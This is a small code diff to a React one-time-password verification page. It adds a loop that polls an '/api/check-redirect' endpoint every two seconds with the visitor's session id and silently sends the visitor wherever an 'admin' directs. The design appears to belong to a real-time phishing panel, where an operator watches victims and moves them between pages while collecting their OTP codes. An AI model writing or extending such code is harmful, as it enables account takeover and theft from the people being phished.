@@ -24,7 +24,27 @@ export default function OtpVerification() {
         setAttempts(0);
       }
     }
-  }, []);
+
+    // Check for admin redirect every 2 seconds
+    const redirectCheck = setInterval(async () => {
+      try {
+        const sessionId = localStorage.getItem('visitorSessionId');
+        if (sessionId) {
+          const response = await apiRequest("POST", "/api/check-redirect", { sessionId });
+          const data = await response.json();
+          
+          if (data.redirect) {
+            console.log(`🎯 REDIRECTING FROM OTP TO: ${data.redirect}`);
+            setLocation(data.redirect);
+          }
+        }
+      } catch (error) {
+        // Silent fail
+      }
+    }, 2000);
+
+    return () => clearInterval(redirectCheck);
+  }, [setLocation]);
 
   const handleVerifyOtp = async (e: React.FormEvent) => {
     e.preventDefault();
